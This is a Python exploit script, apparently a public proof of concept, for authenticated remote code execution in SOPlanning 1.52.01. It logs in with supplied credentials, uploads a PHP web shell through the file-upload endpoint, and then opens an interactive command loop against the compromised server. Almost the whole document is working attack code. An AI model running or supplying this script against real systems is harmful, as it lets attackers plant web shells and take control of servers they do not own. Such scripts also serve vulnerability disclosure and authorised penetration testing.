# Exploit Title: SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE) (Authenticated)
# Date: 6th October, 2024
# Exploit Author: Ardayfio Samuel Nii Aryee
# Version: 1.52.01 
# Tested on: Ubuntu

import argparse
import requests
import random
import string
import urllib.parse

def command_shell(exploit_url):
    commands = input("soplaning:~$ ")
    encoded_command = urllib.parse.quote_plus(commands)

    command_res = requests.get(f"{exploit_url}?cmd={encoded_command}")
    if command_res.status_code == 200:
        print(f"{command_res.text}")
        return
    print(f"Error: An erros occured while running command: {encoded_command}")

def exploit(username, password, url):
    target_url = f"{url}/process/login.php"
    upload_url = f"{url}/process/upload.php"
    link_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    php_filename = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=3))}.php"

    login_data = {"login":username,"password":password}
    res = requests.post(target_url, data=login_data, allow_redirects=False)

    cookies = res.cookies

    multipart_form_data = {
        "linkid": link_id,
        "periodeid": 0,
        "fichiers": php_filename,
        "type": "upload"
    }

    web_shell = "<?php system($_GET['cmd']); ?>"

    files = {
    'fichier-0': (php_filename, web_shell, 'application/x-php')
    }
    upload_res = requests.post(upload_url, cookies=cookies,files=files, data=multipart_form_data)

    if upload_res.status_code == 200 and "File" in upload_res.text:
        print(f"[+] Uploaded ===> {upload_res.text}")
        print("[+] Exploit completed.")
        exploit_url = f"{url}/upload/files/{link_id}/{php_filename}"
        print(f"Access webshell here: {exploit_url}?cmd=<command>")

        if "yes" == input("Do you want an interactive shell? (yes/no) "):
            try:
                while True:
                    command_shell(exploit_url)
            except Exception as e:
                raise(f"Error: {e}")
        else:
            pass


def main():
    parser = argparse.ArgumentParser(prog="SOplanning RCE", \
            usage=f"python3 {__file__.split('/')[-1]} -t http://example.com:9090 -u admin -p admin")

    parser.add_argument("-t", "--target", type=str, help="Target URL (e.g., http://localhost:8080)", required=True)
    parser.add_argument("-u", "--username",type=str,help="username", required=True)
    parser.add_argument("-p", "--password",type=str,help="password", required=True)
    
    args = parser.parse_args()

    exploit(args.username, args.password, args.target)

main()
